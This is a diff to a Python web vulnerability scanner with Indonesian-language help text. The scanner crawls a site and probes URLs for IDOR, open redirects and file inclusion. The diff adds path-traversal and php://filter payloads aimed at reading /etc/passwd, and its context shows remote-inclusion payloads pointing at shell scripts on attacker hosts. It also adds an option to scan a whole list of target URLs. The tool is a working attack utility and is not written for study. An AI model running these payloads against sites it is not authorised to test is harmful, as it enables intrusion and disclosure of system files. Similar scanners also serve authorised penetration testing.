@@ -24,13 +24,20 @@ lfi_payloads = {
     ],
     "filter_bypass": [
         "..%2F..%2F..%2F..%2Fetc%2Fpasswd", "..%5C..%5C..%5C..%5Cetc%5Cpasswd",
-        "..%2F%2F%2F..%2Fetc%2Fpasswd"
+        "..%2F%2F%2F..%2Fetc%2Fpasswd", "..%252F..%252F..%252F..%252Fetc%252Fpasswd"
     ],
     "php_wrapper": [
         "php://filter/convert.base64-encode/resource=../../../etc/passwd",
-        "php://input", "php://stdin", "php://stderr", "php://stdout"
+        "php://input", "php://stdin", "php://stderr", "php://stdout", "php://filter/convert.base64-encode/resource=../../../../../../etc/passwd"
+    ],
+    "double_url_encoding": [
+        "..%252F..%252F..%252F..%252Fetc%252Fpasswd"
+    ],
+    "extended_traversal": [
+        "../../../../../../../../etc/passwd"
     ]
 }
+
 rfi_payloads = {
     "basic": [
         "http://example.com/shell.php",  # Basic RFI payload with remote shell
@@ -98,6 +105,7 @@ rfi_payloads = {
         "http://attacker.com/../../../../../../../../var/log/nginx/access.log"
     ]
 }
+
 params_to_test = [
     'id', 'user', 'username', 'name', 'passwd', 'password', 'email', 'token', 'session', 'key', 'account', 
     'profile', 'data', 'status', 'role', 'privilege', 'access', 'auth', 'login', 'logout', 'reset', 'search',
@@ -148,23 +156,12 @@ def crawl(url, depth=2, visited=None):
     try:
         response = requests.get(url)
         if 'text/html' in response.headers.get('Content-Type', '').lower():
-                try:
-                    soup = BeautifulSoup(response.text, 'html.parser')
-                except Exception:
-                    try:
-                        soup = BeautifulSoup(response.text, 'lxml')
-                    except Exception as e:
-                        print(f"Error parsing HTML at {url}: {e}")
-                        return visited
-        else:
-            print(f"Non-HTML content detected at {url}. Skipping...")
-        return visited
-
-        links = soup.find_all('a', href=True) + soup.find_all('img', src=True) + soup.find_all('script', src=True)
-        for link in links:
-            full_url = urljoin(url, link.get('href', '') or link.get('src', ''))
-            if urlparse(full_url).netloc == urlparse(url).netloc:
-                crawl(full_url, depth-1, visited)
+            soup = BeautifulSoup(response.text, 'html.parser')
+            links = soup.find_all('a', href=True)
+            for link in links:
+                full_url = urljoin(url, link.get('href', ''))
+                if urlparse(full_url).netloc == urlparse(url).netloc:
+                    crawl(full_url, depth-1, visited)
     except requests.exceptions.RequestException as e:
         print(f"Error crawling {url}: {e}")
     return visited
@@ -190,7 +187,6 @@ def test_redirect(url, redirect_url="https://google.com"):
 
 def test_file_inclusion(url):
     found_params = []
-    query_string = url.split('?')[1] if '?' in url else ''
     for param in lfi_payloads['basic']:
         lfi_test_url = f"{url}&file={param}"
         try:
@@ -215,7 +211,6 @@ def test_all_checks(url):
     file_inclusion_result = test_file_inclusion(url)
     results = []
     
-    # Check HTTP status codes
     try:
         response = requests.get(url)
         if response.status_code == 200:
@@ -229,7 +224,6 @@ def test_all_checks(url):
     except requests.exceptions.RequestException as e:
         print(f"[ERROR] Request failed for {url}: {e}")
     
-    # Append vulnerabilities found
     if idor_found:
         results.append(f"found IDOR vulnerability with {', '.join(idor_found)}")
     if redirect_success:
@@ -237,7 +231,6 @@ def test_all_checks(url):
     if file_inclusion_result:
         results.append(f"found file inclusion vulnerability ({', '.join(file_inclusion_result)})")
     
-    # Display results
     if results:
         print(f"[!!!] {', '.join(results)} at URL: {url}")
     else:
@@ -260,6 +253,7 @@ def main():
 
     parser = argparse.ArgumentParser(description="Cek kerentanan IDOR, Redirect, dan File Inclusion (RFI/LFI) pada URL.")
     parser.add_argument('-u', '--url', type=str, help="URL utama untuk diuji.")
+    parser.add_argument('-f', '--file', type=str, help="File teks berisi daftar URL untuk diuji.")
     parser.add_argument('-d', '--depth', type=int, default=2, help="Kedalaman crawling.")
     parser.add_argument('-r', '--redirect', action='store_true', help="Hanya cek kerentanan Redirect.")
     parser.add_argument('-i', '--idor', action='store_true', help="Hanya cek kerentanan IDOR.")
@@ -267,17 +261,32 @@ def main():
     parser.add_argument('-a', '--all', action='store_true', help="Lakukan semua pengecekan.")
     args = parser.parse_args()
 
-    url = args.url
-    depth = args.depth
-    checks = "all" if args.all else (
-        "redirect" if args.redirect else (
-        "idor" if args.idor else (
-        "file_inclusion" if args.file_inclusion else "all")))
+    urls = []
+    if args.url:
+        urls.append(args.url)
+    if args.file:
+        try:
+            with open(args.file, 'r') as file:
+                urls.extend([line.strip() for line in file if line.strip()])
+        except FileNotFoundError:
+            print(f"[ERROR] File '{args.file}' tidak ditemukan.")
+            return
+        except Exception as e:
+            print(f"[ERROR] Gagal membaca file '{args.file}': {e}")
+            return
 
-    visited_urls = crawl(url, depth)
+    if not urls:
+        print("[ERROR] Tidak ada URL yang diberikan untuk diuji. Gunakan -u atau -f untuk memberikan URL.")
+        return
+
+    visited_urls = set()
+    for url in urls:
+        visited_urls.update(crawl(url, args.depth))
     
     with concurrent.futures.ThreadPoolExecutor(max_workers=REQUESTS_PER_SECOND) as executor:
-        executor.map(lambda url: worker(url, checks), visited_urls)
+        executor.map(lambda url: worker(url, "redirect" if args.redirect else 
+                                        "idor" if args.idor else 
+                                        "file_inclusion" if args.file_inclusion else "all"), visited_urls)
 
 if __name__ == "__main__":
     main()
